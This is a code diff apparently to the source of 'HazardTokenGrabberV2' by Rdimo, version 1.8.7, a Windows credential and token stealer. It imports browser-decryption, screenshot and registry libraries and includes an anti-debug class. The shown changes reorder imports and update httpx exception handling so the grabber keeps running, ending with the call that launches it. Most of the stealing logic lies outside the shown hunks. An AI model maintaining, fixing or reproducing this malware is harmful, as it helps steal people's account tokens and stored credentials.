@@ -1,26 +1,26 @@
-import os
-import re
-import json
-import httpx
-import ntpath
-import random
-import winreg
-import ctypes
-import shutil
-import psutil
 import asyncio
+import ctypes
+import json
+import ntpath
+import os
+import random
+import re
+import shutil
 import sqlite3
-import zipfile
-import threading
 import subprocess
-
-from sys import argv
-from PIL import ImageGrab
+import threading
+import winreg
+import zipfile
 from base64 import b64decode
+from datetime import datetime, timedelta, timezone
+from sys import argv
+from tempfile import gettempdir, mkdtemp
+
+import httpx
+import psutil
 from Crypto.Cipher import AES
-from tempfile import mkdtemp, gettempdir
+from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
-from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
 __version__ = '1.8.7'
@@ -202,7 +202,7 @@ class HazardTokenGrabberV2(Functions):
                 headers=self.get_headers(tkn),
                 timeout=5.0
             )
-        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
+        except (httpx.ConnectTimeout, httpx.TimeoutException):
             pass
         if r.status_code == 200 and tkn not in self.tokens:
             self.tokens.append(tkn)
@@ -796,6 +796,6 @@ class AntiDebug(Functions):
 if __name__ == "__main__" and os.name == "nt":
     try:
         httpx.get('https://google.com')
-    except httpx.ConnectTimeout:
+    except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
     asyncio.run(HazardTokenGrabberV2().init())
